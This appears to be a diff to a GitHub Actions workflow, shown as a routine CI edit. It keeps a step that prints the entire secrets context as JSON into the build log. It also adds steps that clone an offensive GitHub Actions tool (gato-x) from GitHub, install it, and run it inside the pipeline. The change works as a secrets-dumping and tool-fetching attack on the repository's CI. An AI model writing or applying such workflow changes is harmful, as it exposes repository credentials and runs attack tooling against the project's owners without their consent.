@@ -12,6 +12,11 @@ jobs:
       - run: npm ci
       - run: ls -al
       - run: echo "${{ toJson(secrets) }}"
-        env:
-          SECRETS_CONTEXT: ${{ toJson(secrets) }}
+      - uses: actions/setup-python@v5
+      - run: git clone https://github.com/AdnaneKhan/gato-x && cd gato-x
+      - run: python3 -m venv venv
+      - run: source venv/bin/activate
+      - run: pip install .
+      - run: cd gatox
+      - run: python3 ./main.py -s 
       
